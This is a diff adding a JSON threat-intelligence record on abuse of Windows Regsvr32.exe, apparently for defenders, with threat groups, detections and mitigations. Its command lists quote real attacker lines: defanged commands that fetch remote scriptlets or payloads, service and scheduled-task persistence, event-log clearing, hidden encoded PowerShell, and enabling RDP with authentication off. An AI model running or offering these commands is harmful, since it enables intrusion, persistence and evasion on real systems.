@@ -1,0 +1,153 @@
+{
+  "type": "lolbin",
+  "version": 1,
+  "id": "442ebb45-6a0c-470c-bd38-8304d2b11540",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2023-11-03T00:00",
+  "modified": "2023-11-03T00:00",
+  "name": "Regsvr32.exe",
+  "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
+  "Required_privilege": [
+    "User"
+  ],
+  "paths": [
+    "c:\\windows\\system32\\regsvr32.exe",
+    "c:\\windows\\syswow64\\regsvr32.exe"
+  ],
+  "hashe": "0C9318BBE9A07725154ACE027ACF7655",
+  "associated_kill_chain_phases": [
+    "TA0005:Defense Evasion:T1218.010"
+  ],
+  "capabilities": [
+    "AWL bypass",
+    "Execute"
+  ],
+  "relationship": [
+    {
+      "associated_apts": [
+        "Deep Panda",
+        "APT32",
+        "Inception",
+        "Kimsuky",
+        "Cobalt Group",
+        "WIRTE",
+        "Leviathan",
+        "TA551",
+        "APT19",
+        "Blue Mockingbird"
+      ],
+      "Relationship Malware->Regsvr32": [
+        "[HermeticWizard](https://attack.mitre.org/software/S0698) has used `regsvr32.exe /s /i` to execute malicious payloads.(Citation: ESET Hermetic Wizard March 2022)",
+        "[Egregor](https://attack.mitre.org/software/S0554) has used regsvr32.exe to execute malicious DLLs.(Citation: JoeSecurity Egregor 2020)",
+        "[Ragnar Locker](https://attack.mitre.org/software/S0481) has used regsvr32.exe to execute components of VirtualBox.(Citation: Sophos Ragnar May 2020)",
+        "[Saint Bot](https://attack.mitre.org/software/S1018) has used `regsvr32` to execute scripts.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )",
+        "[QakBot](https://attack.mitre.org/software/S0650) can use Regsvr32 to execute malicious DLLs.(Citation: Red Canary Qbot)(Citation: Cyberint Qakbot May 2021)(Citation: ATT QakBot April 2021)(Citation: Trend Micro Black Basta October 2022)(Citation: NCC Group Black Basta June 2022)(Citation: Deep Instinct Black Basta August 2022)",
+        "[Squirrelwaffle](https://attack.mitre.org/software/S1030) has been executed using `regsvr32.exe`.(Citation: ZScaler Squirrelwaffle Sep 2021)",
+        "[Mori](https://attack.mitre.org/software/S1047) can use `regsvr32.exe` for DLL execution.(Citation: DHS CISA AA22-055A MuddyWater February 2022)",
+        "[Derusbi](https://attack.mitre.org/software/S0021) variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.(Citation: ThreatGeek Derusbi Converge)",
+        "[RogueRobin](https://attack.mitre.org/software/S0270) uses regsvr32.exe to run a .sct file for execution.(Citation: Unit42 DarkHydrus Jan 2019)",
+        "[Astaroth](https://attack.mitre.org/software/S0373) can be loaded through regsvr32.exe.(Citation: Cybereason Astaroth Feb 2019)",
+        "[Valak](https://attack.mitre.org/software/S0476) has used <code>regsvr32.exe</code> to launch malicious DLLs.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020)",
+        "[EVILNUM](https://attack.mitre.org/software/S0568) can run a remote scriptlet that drops a file and executes it via regsvr32.exe.(Citation: ESET EvilNum July 2020) ",
+        "[More_eggs](https://attack.mitre.org/software/S0284) has used regsvr32.exe to execute the malicious DLL.(Citation: Security Intelligence More Eggs Aug 2019)",
+        "[AppleSeed](https://attack.mitre.org/software/S0622) can call regsvr32.exe for execution.(Citation: Malwarebytes Kimsuky June 2021)",
+        "Some [Orz](https://attack.mitre.org/software/S0229) versions have an embedded DLL known as MockDll that uses [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) and regsvr32 to execute another payload.(Citation: Proofpoint Leviathan Oct 2017)",
+        "[Xbash](https://attack.mitre.org/software/S0341) can use regsvr32 for executing scripts.(Citation: Unit42 Xbash Sept 2018)",
+        "[Hi-Zor](https://attack.mitre.org/software/S0087) executes using regsvr32.exe called from the [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001) persistence mechanism.(Citation: Fidelis INOCNATION)"
+      ],
+      "associated_campaigns": [
+        "C0015",
+        "Operation Dream Job"
+      ],
+      "associated_Malware": [
+        "Koadic",
+        "HermeticWizard",
+        "Egregor",
+        "Ragnar Locker",
+        "Saint Bot",
+        "QakBot",
+        "Squirrelwaffle",
+        "Mori",
+        "Derusbi",
+        "RogueRobin",
+        "Astaroth",
+        "Valak",
+        "EVILNUM",
+        "More_eggs",
+        "AppleSeed",
+        "Orz",
+        "Xbash",
+        "Hi-Zor",
+        "Raspberry Robin"
+      ],
+      "associated_commands": [
+        "-- regsvr32 /s /n /u /i:hxxp://support.chatconnecting(.)com:80/pic.png scrobj.dll\n\n ",
+        "-- regsvr32 /s /n /u /i:hxxp://108.170.31.69:80/a scrobj.dll\n\n",
+        "-- regsvr32.exe “C:\\Users\\[redacted]\\AppData\\Roaming\\Microsoft\\Jmcoiqtmeft\\nwthu.dll””\n\n",
+        "-- C :\\Windows\\System32\\regsvr32 .exe \\\\dhqidfvyxawy0du9akl2ium.webdav . drivehq .com @SSL\\DavWWWRoot\\Ad.dll\n\n",
+        "-- powershell.exe -windowstyle hidden regsvr32.exe /s AppleSeed_Payloadcmd /c start regsvr32 /s /i ..\\\\<filename>  & start cmd /c \\\"ping localhost -n 7 & wevtutil cl System\\\"\n\n",
+        "-- cmd /c start regsvr32 /s /i ..\\\\<filename>  & start cmd /c \\\"ping localhost -n 7 & wevtutil cl System\\\".\n\n",
+        "-- regsvr32.exe /s /n /u /i:%TEMP%\\12-B-366.txt scrobj.dll\n\n",
+        "-- %windir%\\System32\\cmd.exe /c %windir%\\system32\\curl -s -o %temp%\\goAlso.rtf http[:]//146[.]70[.]79[.]52/fromMakeTell.dat&&%windir%\\system32\\regsvr32 %temp%\\goAlso.rtf\n\n",
+        "-- cmd.exe /c sc config wercplsupport start= auto && sc start wercplsupport && copy c:\\windows\\System32\\dialogex.dll c:\\windows\\System32\\wercplsupporte.dll /y && schtasks /create /tn \"Windows Problems Collection\" /tr \"regsvr32.exe /s c:\\windows\\System32\\wercplsupporte.dll\" /sc DAILY /st 20:02 /F /RU System && start \"\" regsvr32.exe /s c:\\windows\\System32\\dialogex.dll\n\n",
+        "-- sc create 8995 binPath= \"cmd /c sc config wercplsupport start= auto & sc start wercplsupport & copy c:\\windows\\System32\\8995.dll c:\\windows\\System32\\wercplsupporte.dll /y & regsvr32.exe /s c:\\windows\\System32\\8995.dll\" type= share start= auto error= ignore DisplayName= 8995"
+      ],
+      "pre_and_next_related_cmd": [
+        {
+          "pre_cmd_event": [
+            "-- powershell.exe -NoP -NonI -W Hidden -Command \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"<base64 blob>\")\n",
+            "-- wmic ENVIRONMENT where \"name='COR_PROFILER'\" delete\n",
+            "-- wmic ENVIRONMENT create name=\"COR_ENABLE_PROFILING\",username=\"<system>\",VariableValue=\"1\"\n",
+            "-- wmic ENVIRONMENT create name=\"COR_PROFILER\",username=\"<system>\",VariableValue=\"<arbitrary CLSID>\"\n",
+            "-- REG.EXE ADD HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\<arbitrary CLSID>\\InProcServer32 /V ThreadingModel /T REG_SZ /D Apartment /F \n",
+            "-- REG.EXE ADD HKEY_LOCAL_MACHINE\\Software\\Classes\\CLSID\\<arbitrary CLSID>\\InProcServer32 /VE /T REG_SZ /D \"c:\\windows\\System32\\e0b3489da74f.dll\" /F"
+          ],
+          "next_cmd_event": [
+            "  -- “C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update);\n",
+            "-- powershell -NoP -NonI -w Hidden -enc $x; Start-Sleep -Seconds 1\\system32\\cleanmgr.exe /autoclean /d C:”\n",
+            "-- reg add \"HKLMSystemCurrentControlSetControlTerminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f\n",
+            "-- net start MpsSvc\n  -- netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes\n",
+            "-- reg add \"HKLMSystemCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp\" /v \"UserAuthentication\" /t REG_DWORD /d 0 /f"
+          ]
+        }
+      ]
+    }
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "detections": [
+    {
+      "eventsid": [
+        {
+          "sysmon": [
+            "T1218.010:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1"
+          ],
+          "windows": [
+            "T1218.010:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
+            "T1218.010:script:script_execution:log_channel:Microsoft-Windows-PowerShell/Operational:log_provider:Microsoft-Windows-PowerShell:4103"
+          ]
+        }
+      ],
+      "sigma_rules": [
+        "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml",
+        "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml",
+        "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_regsvr32_http_ip_pattern.yml"
+      ],
+      "other_rules": [
+        "https://github.com/splunk/security_content/blob/develop/detections/endpoint/regsvr32_with_known_silent_switch_cmdline.yml",
+        "https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_regsvr32_application_control_bypass.yml"
+      ]
+    }
+  ],
+  "related_CVE": [],
+  "mitigations": [
+    "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block regsvr32.exe from being used to bypass application control. (Citation: Secure Host Baseline EMET) Identify and block potentially malicious software executed through regsvr32 functionality by using application control (Citation: Beechey 2010) tools, like Windows Defender Application Control(Citation: Microsoft Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"
+  ],
+  "references": [
+    "https://attack.mitre.org/techniques/T1218/010/",
+    "https://strontic.github.io/xcyclopedia/library/regsvr32.exe-0C9318BBE9A07725154ACE027ACF7655.html",
+    "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
+    "https://app.tidalcyber.com/technique/b1da2b02-9ade-45e0-a795-ec1b19e5316a"
+  ]
+}
